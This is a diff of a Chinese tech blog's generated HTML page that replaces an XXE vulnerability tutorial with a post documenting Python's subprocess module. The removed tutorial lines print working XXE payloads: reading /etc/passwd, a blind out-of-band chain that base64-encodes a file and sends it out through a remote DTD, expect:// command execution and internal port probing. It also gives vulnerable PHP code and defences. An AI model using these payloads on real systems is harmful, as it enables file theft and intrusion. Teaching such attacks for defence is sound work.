@@ -15,26 +15,26 @@
 
 
 
-<meta name="description" content="0x00 必备XML基础知识DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体的声明是在DTD声明里面的，属于DTD声明的一部分。">
-<meta name="keywords" content="XXE,XML注入,OWASP Top10 2017">
+<meta name="description" content="0x00 概述subprocess模块允许你创建一个新的进程，新建进程是当前程序的子进程。可以连接到新建进程的input/output/error pipes, 并且可以获取到它们的返回码。 这个模块是为了取代下面这些比较老的模块功能： 12os.systemos.spawn* subprocess模块提供两种方法来创建新的进程：  subprocess.run() subprocess.Pope">
+<meta name="keywords" content="Language,Python模块">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XXE（XML External Entity）漏洞">
-<meta property="og:url" content="https://sakuxa.com/2019/03/01/XXE/index.html">
+<meta property="og:title" content="Python模块 Chapter 3：subprocess">
+<meta property="og:url" content="https://sakuxa.com/2019/04/11/03python模块之subprocess/index.html">
 <meta property="og:site_name" content="IT技术学习分享自留地">
-<meta property="og:description" content="0x00 必备XML基础知识DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体的声明是在DTD声明里面的，属于DTD声明的一部分。">
+<meta property="og:description" content="0x00 概述subprocess模块允许你创建一个新的进程，新建进程是当前程序的子进程。可以连接到新建进程的input/output/error pipes, 并且可以获取到它们的返回码。 这个模块是为了取代下面这些比较老的模块功能： 12os.systemos.spawn* subprocess模块提供两种方法来创建新的进程：  subprocess.run() subprocess.Pope">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://sakuxa.com/2019/03/01/XXE/InkedQQ截图20190301091748_LI.jpg">
-<meta property="og:image" content="https://sakuxa.com/2019/03/01/XXE/QQ截图20190301093413.png">
-<meta property="og:image" content="https://sakuxa.com/2019/03/01/XXE/15129735161149.png">
-<meta property="og:image" content="https://sakuxa.com/2019/03/01/XXE/S:/hexo/myblog/source/_posts/XXE/QQ截图20190301133421.png">
-<meta property="og:image" content="https://sakuxa.com/2019/03/01/XXE/QQ截图20190301133122.png">
-<meta property="og:image" content="https://sakuxa.com/2019/03/01/XXE/QQ截图20190301152037.png">
-<meta property="og:image" content="https://sakuxa.com/2019/03/01/XXE/QQ截图20190301152528.png">
-<meta property="og:updated_time" content="2019-03-22T03:57:54.172Z">
+<meta property="og:image" content="https://sakuxa.com/2019/04/11/03python模块之subprocess/QQ截图20190411201111.png">
+<meta property="og:image" content="https://sakuxa.com/2019/04/11/03python模块之subprocess/QQ截图20190411202330.png">
+<meta property="og:image" content="https://sakuxa.com/2019/04/11/03python模块之subprocess/QQ截图20190411195631.png">
+<meta property="og:image" content="https://sakuxa.com/2019/04/11/03python模块之subprocess/QQ截图20190411161046.png">
+<meta property="og:image" content="https://sakuxa.com/2019/04/11/03python模块之subprocess/QQ截图20190411161550.png">
+<meta property="og:image" content="https://sakuxa.com/2019/04/11/03python模块之subprocess/QQ截图20190411162626.png">
+<meta property="og:image" content="https://sakuxa.com/2019/04/11/03python模块之subprocess/QQ截图20190411164318.png">
+<meta property="og:updated_time" content="2019-04-11T12:39:39.426Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XXE（XML External Entity）漏洞">
-<meta name="twitter:description" content="0x00 必备XML基础知识DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体的声明是在DTD声明里面的，属于DTD声明的一部分。">
-<meta name="twitter:image" content="https://sakuxa.com/2019/03/01/XXE/InkedQQ截图20190301091748_LI.jpg">
+<meta name="twitter:title" content="Python模块 Chapter 3：subprocess">
+<meta name="twitter:description" content="0x00 概述subprocess模块允许你创建一个新的进程，新建进程是当前程序的子进程。可以连接到新建进程的input/output/error pipes, 并且可以获取到它们的返回码。 这个模块是为了取代下面这些比较老的模块功能： 12os.systemos.spawn* subprocess模块提供两种方法来创建新的进程：  subprocess.run() subprocess.Pope">
+<meta name="twitter:image" content="https://sakuxa.com/2019/04/11/03python模块之subprocess/QQ截图20190411201111.png">
 
 <link rel="apple-touch-icon" href="/apple-touch-icon.png">
 
@@ -66,7 +66,7 @@
 <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
 
 
-<title>XXE（XML External Entity）漏洞 | IT技术学习分享自留地</title>
+<title>Python模块 Chapter 3：subprocess | IT技术学习分享自留地</title>
 
 <script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
 <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
@@ -270,11 +270,11 @@
     </div>
     <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
 </nav>
-      <div class="body-wrap"><article id="post-XXE" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-03python模块之subprocess" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
-      <a href="/2019/03/01/XXE/" class="article-date">
-      <time datetime="2019-03-01T00:59:43.000Z" itemprop="datePublished">2019-03-01</time>
+      <a href="/2019/04/11/03python模块之subprocess/" class="article-date">
+      <time datetime="2019-04-11T12:25:26.000Z" itemprop="datePublished">2019-04-11</time>
 </a>
 
 
@@ -289,7 +289,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      XXE（XML External Entity）漏洞
+      Python模块 Chapter 3：subprocess
     </h1>
   
 
@@ -298,13 +298,13 @@
       <div class="article-info article-info-post">
         
     <div class="article-category tagcloud">
-    <a class="article-category-link" href="/categories/WEB漏洞学习/">WEB漏洞学习</a>
+    <a class="article-category-link" href="/categories/Python/">Python</a>
     </div>
 
 
         
     <div class="article-tag tagcloud">
-        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/OWASP-Top10-2017/">OWASP Top10 2017</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XML注入/">XML注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XXE/">XXE</a></li></ul>
+        <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Language/">Language</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Python模块/">Python模块</a></li></ul>
     </div>
 
         <div class="clearfix"></div>
@@ -314,81 +314,138 @@
     <div class="article-entry" itemprop="articleBody">
       
           
-        <h2 id="0x00-必备XML基础知识"><a href="#0x00-必备XML基础知识" class="headerlink" title="0x00 必备XML基础知识"></a>0x00 必备XML基础知识</h2><p>DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。</p>
-<p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体的声明是在DTD声明里面的，属于DTD声明的一部分。</p>
-<a id="more"></a>
-<p><img src="/2019/03/01/XXE/InkedQQ截图20190301091748_LI.jpg" alt></p>
-<p>更多XML基础知识跳转<a href="https://sakuxa.com/2019/02/28/xml/">这里</a>。</p>
-<h2 id="0x01-XXE漏洞概述"><a href="#0x01-XXE漏洞概述" class="headerlink" title="0x01 XXE漏洞概述"></a>0x01 XXE漏洞概述</h2><p>XXE -“xml external entity injection”即”xml外部实体注入漏洞”。</p>
-<p>攻击者通过向服务器注入指定的xml实体内容,从而让服务器按照指定的配置进行执行,导致问题。<br>也就是说服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入。</p>
-<p>在PHP里面解析xml用的是libxml,其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。可以使用phpinfo()查看libxml的版本信息。 </p>
-<p><img src="/2019/03/01/XXE/QQ截图20190301093413.png" alt></p>
-<p><strong>漏洞检测：</strong></p>
-<p>首先，检测XML是否会被解析。<code>&amp;xxe;</code>是否会被解析为”this is xxe”.(注意：GET请求时记得把<code>&amp;</code>进行URL编码)</p>
-<blockquote>
-<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe &quot;this is xxe..&quot;&gt; ]&gt; &lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>
-</blockquote>
-<p>然后，检测服务器是否支持外部实体。执行Payload后查看<code>test.com</code>服务器的http访问日志，看是否存在<code>GET /xxe_test HTTP/1.0</code>的请求，若存在则证明支持外部实体。</p>
-<blockquote>
-<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM  &quot;http://test.com/xxe_test&quot;&gt; ]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>
-</blockquote>
-<h2 id="0x02-恶意引入外部实体"><a href="#0x02-恶意引入外部实体" class="headerlink" title="0x02 恶意引入外部实体"></a>0x02 恶意引入外部实体</h2><p><strong>情景一：</strong></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [    </span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT note any&gt;   </span></span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> &amp;xxe; <span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>情景二：</strong></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note [    </span></span><br><span class="line"><span class="meta">  &lt;!ELEMENT note any&gt;   </span></span><br><span class="line"><span class="meta"> </span></span><br><span class="line"><span class="meta">  &lt;!ENTITY % hack SYSTEM "hack.dtd" &gt;</span></span><br><span class="line"><span class="meta">  % hack  //会被hack.dtd的内容替换。</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> &amp;xxe; <span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>hack.dtd</code>文件内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br></pre></td></tr></table></figure>
-<p><strong>情景三：</strong></p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE note SYSTEM "hack.dtd"&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span> &amp;xxe; <span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<p><code>hack.dtd</code>文件内容：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;</span><br></pre></td></tr></table></figure>
-<p><strong>外部引用实体时，不同的程序可以使用的协议不一样：</strong></p>
-<p><img src="/2019/03/01/XXE/15129735161149.png" alt></p>
-<h2 id="0x03-XXE漏洞利用"><a href="#0x03-XXE漏洞利用" class="headerlink" title="0x03 XXE漏洞利用"></a>0x03 XXE漏洞利用</h2><p>利用xxe漏洞可以进行拒绝服务攻击，文件读取，命令(代码)执行，SQL(XSS)注入，内外扫描端口，入侵内网站点等，内网探测和入侵是利用xxe中支持的协议进行内网主机和端口发现，可以理解是使用XXE进行SSRF的利用。</p>
-<p>一般XXE利用分为两大场景：有回显和无回显。</p>
-<blockquote>
+        <h3 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h3><p><code>subprocess</code>模块允许你创建一个新的进程，新建进程是当前程序的子进程。可以连接到新建进程的input/output/error pipes, 并且可以获取到它们的返回码。</p>
+<p>这个模块是为了取代下面这些比较老的模块功能：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">os.system</span><br><span class="line">os.spawn*</span><br></pre></td></tr></table></figure>
+<p>subprocess模块提供两种方法来创建新的进程：</p>
 <ul>
-<li>有回显的情况可以直接在页面中看到Payload的执行结果或现象。</li>
-<li>无回显的情况又称为Blind XXE，可以使用带外数据通道提取数据。</li>
+<li><code>subprocess.run()</code></li>
+<li><code>subprocess.Popen()</code></li>
+</ul>
+<blockquote>
+<p>使用<code>run()</code>方法创建新进程可以满足绝大多数需求，但<code>Popen（）</code>类提供比<code>run()</code>更高级更灵活的用法。</p>
+</blockquote>
+<a id="more"></a>
+<h3 id="0x01-subprocess-Popen"><a href="#0x01-subprocess-Popen" class="headerlink" title="0x01 subprocess.Popen()"></a>0x01 subprocess.Popen()</h3><blockquote>
+<p>产生一个子进程执行程序：</p>
+<ul>
+<li>对于 POSIX 系统, 该类调用<code>os.execvp()</code>函数来创建子进程。</li>
+<li>对于 Windows 系统,该类调用Windows API函数 <code>CreateProcess()</code> 来创建子进程。</li>
 </ul>
 </blockquote>
-<p>基本漏洞源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $xml=simplexml_load_string($_REQUEST[<span class="string">'xml'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;$xml&lt;/p&gt;"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p><strong>1.任意文件读取：</strong></p>
-<p><strong>有回显的情况：</strong></p>
-<p>Payload:<code>&lt;!DOCTYPE note [&lt;!ELEMENT note ANY &gt;&lt;!ENTITY xxe SYSTEM &quot;file:///S://aa.txt&quot;&gt;]&gt;&lt;note&gt;&amp;xxe;&lt;/note&gt;</code> </p>
-<p><img src="/2019/03/01/XXE/S:/hexo\myblog\source\_posts\XXE\QQ截图20190301133421.png" alt></p>
-<p><img src="/2019/03/01/XXE/QQ截图20190301133122.png" alt></p>
-<p><strong>无回显的情况：</strong></p>
-<p><code>%file;</code>会调用php插件对要读取的文件内容进行Base64编码。</p>
-<p><code>%dtd;</code>会请求我们编写好的<code>evil.xml</code>文件，会被<code>evil.xml</code>文件内容替换。</p>
-<p><code>%payload;</code>被<code>&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http://localhost/?content=%file;&#39;&gt;</code>替换。</p>
-<p><code>%send;</code>会向我们的服务器发送一次请求，请求的参数是被编码的文件内容，此时我们去查看<code>http</code>的访问日志就能看到被编码的文件内容，进行Base64解码就能得到文件内容。</p>
-<p>Payload:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE note [ </span><br><span class="line">  &lt;!ELEMENT note ANY &gt;</span><br><span class="line">  &lt;!ENTITY % file SYSTEM &quot;php://filter/convert.base64-encode/resource=/S:/test.txt&quot;&gt;</span><br><span class="line">  &lt;!ENTITY % dtd SYSTEM &quot;http://localhost/evil.xml&quot;&gt;</span><br><span class="line">  %dtd; %payload; %send;  ]&gt;</span><br></pre></td></tr></table></figure>
-<p><code>evil.xml</code>文件内容：内部<code>send</code>的<code>%</code>要用实体：<code>&amp;#x25;</code></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % payload &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://localhost/?content=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>
-<p><code>http</code>访问日志：（到配置文件<code>http.conf</code>里找到<code>CustomLog &quot;logs/access.log&quot; common</code>并删除掉<code>#</code>号注释）</p>
-<p><img src="/2019/03/01/XXE/QQ截图20190301152037.png" alt></p>
-<p><strong>PS:</strong>之所以要引入文件<code>evil.xml</code>原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p>
-<p>Base64解码：</p>
-<p><img src="/2019/03/01/XXE/QQ截图20190301152528.png" alt></p>
-<p><strong>2.命令执行：</strong></p>
-<p>安装了expect扩展的PHP环境可以执行系统命令，其他协议也有可能存在其他执行系统命令的方法。</p>
-<p><a href="http://php.net/manual/zh/wrappers.expect.php" target="_blank" rel="noopener">expect</a>封装协议默认未开启。</p>
-<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;expect://whoami&quot;&gt; ]&gt;&lt;x&gt;&amp;xxe;&lt;/x&gt;</code></p>
-<p><strong>3.内网端口探测：</strong></p>
-<p>Payload:<code>&lt;!DOCTYPE ANY [ &lt;!ENTITY xxe SYSTEM &quot;http://localhost:81&quot;&gt; ]&gt;&lt;x&gt;%26xxe;&lt;/x&gt;</code></p>
-<h2 id="0x04-漏洞防御"><a href="#0x04-漏洞防御" class="headerlink" title="0x04 漏洞防御"></a>0x04 漏洞防御</h2><ul>
-<li>尽可能使用简单的数据格式（如：JSON），避免对敏感数据进行序列化。</li>
-<li>及时修复或更新应用程序或底层操作系统使用的所有XML处理器和库。</li>
-<li>在服务器端实施积极的（“白名单”）输入验证、过滤和清理，以防止在XML文档、标题或节点中出现恶意数据。关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者，SYSTEM和PUBLIC。</li>
-<li>使用开发语言提供的禁用外部实体的方法。</li>
+<p><strong>Popen类的构造方法：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, args, bufsize=<span class="number">-1</span>, executable=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 stdin=None, stdout=None, stderr=None,</span></span></span><br><span class="line"><span class="function"><span class="params">                 preexec_fn=None, close_fds=_PLATFORM_DEFAULT_CLOSE_FDS,</span></span></span><br><span class="line"><span class="function"><span class="params">                 shell=False, cwd=None, env=None, universal_newlines=False,</span></span></span><br><span class="line"><span class="function"><span class="params">                 startupinfo=None, creationflags=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">                 restore_signals=True, start_new_session=False,</span></span></span><br><span class="line"><span class="function"><span class="params">                 pass_fds=<span class="params">()</span>, *, encoding=None, errors=None)</span>:</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>args</strong>：该参数要求是一个序列类型（list、tuple…）或字符串（str）。</li>
 </ul>
+<blockquote>
+<p>如果<strong>args</strong>是一个序列，那么序列的第一个元素被作为程序名（路径），之后的作为参数。</p>
+<p>在Windows上时，如果<strong>args</strong>是一个序列，会被转换为字符串。</p>
+</blockquote>
+<ul>
+<li><strong>shell</strong>：为<code>True</code>时，使用系统shell执行<strong>args</strong>指定的程序，默认是<code>False</code>。</li>
+</ul>
+<blockquote>
+<p>On POSIX with <code>shell=True</code>, the shell defaults to <code>/bin/sh</code>.</p>
+<p>对于Windows，你只有在需要执行内置DOS命令时（例如，<code>dir</code>、<code>ipconfig</code>…），才使用<code>shell=True</code>。运行批处理文件（.bat）或可执行文件时没有必要将<code>shell</code>参数设为<code>True</code>。</p>
+</blockquote>
+<ul>
+<li><strong>stdin、stdout、stderr</strong>： 指定执行程序的标准输入、标准输出、标准错误输出的文件句柄。</li>
+</ul>
+<blockquote>
+<p>若不指定则默认都为<code>None</code>，表示不进行重定向，那么子进程会从父进程继承文件句柄。</p>
+<p>若指定了，即进行重定向。有效值可以为<code>subprocess.PIPE</code>、<code>subprocess.DEVNULL</code>、现有文件描述符（正整数）、现有文件对象（open()函数返回的对象）和<code>None</code>。 </p>
+<p>另外，<em>stderr</em>可以是 <code>subprocess.STDOUT</code>，表示应用程序的标准错误输出的文件句柄与标准输出的文件句柄相同。（相当于<code>2&gt;&amp;1</code>）</p>
+</blockquote>
+<p><img src="/2019/04/11/03python模块之subprocess/QQ截图20190411201111.png" alt></p>
+<ul>
+<li><strong>cwd</strong>：如果<em>cwd</em>不是<code>None</code>，则在执行子进程程序之前先将工作目录更改为 <em>cwd</em>。</li>
+<li>如果指定了<em>encoding</em>或<em>erroes</em>，或者<em>text</em>为<code>True</code>，则<em>stdin</em>，<em>stdout</em>和<em>stderr</em>的流为文本（str）流，<em>universal_newlines</em>参数等同于<em>text</em>，并提供向后兼容性。默认情况下，数据流为二进制流。</li>
+</ul>
+<p><img src="/2019/04/11/03python模块之subprocess/QQ截图20190411202330.png" alt></p>
+<p><strong>Popen类的实例有如下方法：</strong></p>
+<ul>
+<li><code>Popen.poll（）</code>：检查子进程是否已终止。</li>
+<li><code>Popen.wait(timeout=None)</code>：挂起等待子进程结束，若设置了<em>timeout</em>参数，超时但进程还未结束则抛出<code>TimeoutExpired</code>异常。</li>
+<li><code>Popen.communicate(input=None, timeout=None)</code>：与子进程进行交互，发送数据到标准输入、从标准输出或标准错误输出读取数据直到遇到EOF（end-of-file）。</li>
+</ul>
+<blockquote>
+<p><code>communicate()</code>函数返回值为元组 (stdout_data, stderr_data)。</p>
+</blockquote>
+<ul>
+<li><code>Popen.send_signal(signal)</code>：发送信号到子进程。</li>
+<li><code>Popen.terminate()</code>：终止子进程。</li>
+</ul>
+<blockquote>
+<p>On Posix OSs the method sends SIGTERM to the child. </p>
+<p>On Windows the Win32 API function <code>TerminateProcess()</code> is called to stop the child.</p>
+</blockquote>
+<ul>
+<li><code>Popen.kill()</code></li>
+</ul>
+<blockquote>
+<p>Kills the child. On Posix OSs the function sends SIGKILL to the child. On Windows <code>kill()</code>is an alias for <code>terminate()</code>.</p>
+</blockquote>
+<p><strong>Popen类的实例的属性：</strong></p>
+<ul>
+<li><code>Popen.args</code>：获取<em>args</em>参数的值，是一个<code>list</code>或<code>str</code>。</li>
+<li><code>Popen.stdin</code>：</li>
+</ul>
+<blockquote>
+<p>如果实例化时，<em>stdin</em>参数是<code>PIPE</code>, 该属性会返回<code>open()</code>函数返回的可写的文件对象，该文件对象链接着子程序的标准输入。</p>
+<ul>
+<li>如果指定了<em>encoding</em>或<em>errors</em>参数或者<em>universal_newlines</em>参数为<code>True</code>, 文件流为文本（str）流, 否则为字节（byte）流。</li>
+</ul>
+</blockquote>
+<ul>
+<li><code>Popen.stdout</code>：</li>
+</ul>
+<blockquote>
+<p>如果实例化时，<em>stdout</em>参数是<code>PIPE</code>, 该属性会返回<code>open()</code>函数返回的可读的文件对象，该文件对象链接着子程序的标准输出，读取该文件对象可以获得子程序的标准输出。</p>
+<ul>
+<li>如果指定了<em>encoding</em>或<em>errors</em>参数或者<em>universal_newlines</em>参数为<code>True</code>, 文件流为文本（str）流, 否则为字节（byte）流。</li>
+</ul>
+<p>如果实例化时，<em>stdout</em>参数不是<code>PIPE</code>, 该属性返回 <code>None</code>。</p>
+</blockquote>
+<ul>
+<li><code>Popen.stderr</code>：同上，但是读取的是子进程的标准错误输出。</li>
+</ul>
+<p><img src="/2019/04/11/03python模块之subprocess/QQ截图20190411195631.png" alt></p>
+<ul>
+<li><code>Popen.pid</code>：获取子进程的PID。如果<code>shell=True</code>，返回则是系统shell进程的PID。</li>
+<li><code>Popen.returncode</code>：返回码。</li>
+</ul>
+<p><strong>上下文管理：</strong></p>
+<blockquote>
+<p>Popen对象支持<code>with</code>语句进行上下文管理。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> Popen([<span class="string">"ifconfig"</span>], stdout=PIPE) <span class="keyword">as</span> proc:</span><br><span class="line">    log.write(proc.stdout.read())</span><br></pre></td></tr></table></figure>
+<h3 id="0x02-subprocess-run"><a href="#0x02-subprocess-run" class="headerlink" title="0x02 subprocess.run()"></a>0x02 subprocess.run()</h3><blockquote>
+<p>运行<em>args</em>描述的命令。等待命令执行完成，然后返回一个<code>CompletedProcess</code>类的实例。</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">subprocess.run(args, *, stdin=<span class="keyword">None</span>, input=<span class="keyword">None</span>, stdout=<span class="keyword">None</span>, stderr=<span class="keyword">None</span>, capture_output=<span class="keyword">False</span>, shell=<span class="keyword">False</span>, </span><br><span class="line">               cwd=<span class="keyword">None</span>, timeout=<span class="keyword">None</span>, check=<span class="keyword">False</span>, encoding=<span class="keyword">None</span>, errors=<span class="keyword">None</span>, text=<span class="keyword">None</span>, env=<span class="keyword">None</span>, universal_newlines=<span class="keyword">None</span>)</span><br></pre></td></tr></table></figure>
+<p>如果<em>capture_output</em> 为<code>True</code>, <code>stdout</code> 和 <code>stderr</code> 将会被捕获，默认为<code>False</code>。 </p>
+<p>如果<em>shell</em>为<code>True</code>，表示使用系统的shell来执行<em>arg</em>描述的命令；如果为<em>shell</em>为<code>False</code>，则打开<em>arg</em>描述的对象。</p>
+<p><img src="/2019/04/11/03python模块之subprocess/QQ截图20190411161046.png" alt></p>
+<p>如果没有指定<em>encoding</em>（即为<code>None</code>），那么<code>stdout</code>和<code>stderr</code>是<code>bytes</code>类型。若指定了<em>encoding</em>，就会进行解码为<code>str</code>。</p>
+<p><img src="/2019/04/11/03python模块之subprocess/QQ截图20190411161550.png" alt></p>
+<h3 id="0x04-subprocess-CompletedProcess"><a href="#0x04-subprocess-CompletedProcess" class="headerlink" title="0x04 subprocess.CompletedProcess()"></a>0x04 subprocess.CompletedProcess()</h3><blockquote>
+<p><code>subprocess.run()</code>方法执行结束后返回该类的实例。</p>
+</blockquote>
+<p><strong>该类有如下方法（属性）：</strong></p>
+<ul>
+<li><strong>args</strong>：获取传入<code>run()</code>方法的第一个参数，是一个<code>list</code>或<code>str</code>。</li>
+<li><strong>returncode</strong>：获取返回码，为0表示函数执行成功。</li>
+<li><strong>stdout</strong>：从标准输出中获取<code>run()</code>方法的输出结果（<code>capture_output=True</code>时才能获取到结果），结果为<code>bytes</code>类型字符串（若<code>encoding</code>参数不为<code>None</code>，则结果为<code>str</code>类型）。</li>
+<li><strong>stderr</strong>：同上，但获取的是标准错误输出结果。</li>
+<li><strong>check_returncode（）</strong>：当<code>run()</code>的返回值不为0时，调用该方法会抛出一个<code>CalledProcessError</code>异常。</li>
+</ul>
+<p><strong>run()方法执行成功的情况：</strong></p>
+<p><img src="/2019/04/11/03python模块之subprocess/QQ截图20190411162626.png" alt></p>
+<p><strong>run()方法执行失败的情况：</strong></p>
+<p><img src="/2019/04/11/03python模块之subprocess/QQ截图20190411164318.png" alt></p>
 <p><strong>参考链接：</strong></p>
-<p><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/blob/master/XML%E6%B3%A8%E5%85%A5/XXE%E6%BC%8F%E6%B4%9E.md</a></p>
-<p><a href="https://www.cnblogs.com/backlion/p/9302528.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9302528.html</a></p>
-<p><a href="https://www.jianshu.com/p/77f2181587a4" target="_blank" rel="noopener">https://www.jianshu.com/p/77f2181587a4</a></p>
+<p><a href="https://docs.python.org/3/library/subprocess.html" target="_blank" rel="noopener">https://docs.python.org/3/library/subprocess.html</a></p>
 
       
     </div>
@@ -397,13 +454,13 @@
   
     
     <div class="copyright">
-        <p><span>本文标题:</span><a href="/2019/03/01/XXE/">XXE（XML External Entity）漏洞</a></p>
+        <p><span>本文标题:</span><a href="/2019/04/11/03python模块之subprocess/">Python模块 Chapter 3：subprocess</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">sh4douu</a></p>
-        <p><span>发布时间:</span>2019-03-01, 08:59:43</p>
-        <p><span>最后更新:</span>2019-03-22, 11:57:54</p>
+        <p><span>发布时间:</span>2019-04-11, 20:25:26</p>
+        <p><span>最后更新:</span>2019-04-11, 20:39:39</p>
         <p>
-            <span>原始链接:</span><a class="post-url" href="/2019/03/01/XXE/" title="XXE（XML External Entity）漏洞">https://sakuxa.com/2019/03/01/XXE/</a>
-            <span class="copy-path" data-clipboard-text="原文: https://sakuxa.com/2019/03/01/XXE/　　作者: sh4douu" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
